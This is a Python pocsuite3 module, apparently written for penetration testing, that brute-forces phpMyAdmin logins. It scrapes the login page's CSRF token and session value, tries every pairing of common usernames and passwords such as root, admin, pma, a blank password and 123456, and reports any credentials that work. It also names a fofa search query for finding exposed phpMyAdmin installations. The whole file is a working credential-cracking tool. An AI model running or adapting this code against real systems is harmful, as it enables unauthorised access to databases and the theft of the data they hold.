"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import re
import html
import itertools
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str


class PmaBurstPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['z3r0yu']
    vulDate = '2020-08-25'
    createDate = '2020-08-25'
    updateDate = '2020-08-25'
    references = ['']
    name = 'phpmyadmin weak password bruteforce'
    appPowerLink = ''
    appName = 'phpmyadmin'
    appVersion = '''
    ALL
    '''
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''
    fofa.so
    app="phpMyAdmin"


    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.TOOLS.CRACK

    def pma_login(self, url, username, password):
        for i in range(2):
            try:
                res = requests.get(url)
                cookies = dict(res.cookies)
                data = {
                    'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
                    'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
                    'pma_username': username,
                    'pma_password': password,
                }
                res = requests.post(url, cookies=cookies, data=data, timeout=3)
                cookies = dict(res.cookies)
                return 'pmaAuth-1' in cookies
            except:
                pass
        return False

    def get_word_list(self):
        common_username = ('root', 'guest', 'admin', 'pma')
        common_password = ('root', 'guest', 'admin', '', 'pma',
                           'toor', '123456', '12345678', '12345')
        return itertools.product(common_username, common_password)
        # with open(paths.WEAK_PASS) as f:
        #     return itertools.product(common_username, f)

    def _verify(self):
        result = {}
        # print(self.url)
        url = self.url
        # print(url)
        try:
            for username, password in self.get_word_list():
                if self.pma_login(url, username.strip(), password.strip()):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Username'] = username.strip()
                    result['VerifyInfo']['Password'] = password.strip()
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(PmaBurstPOC)
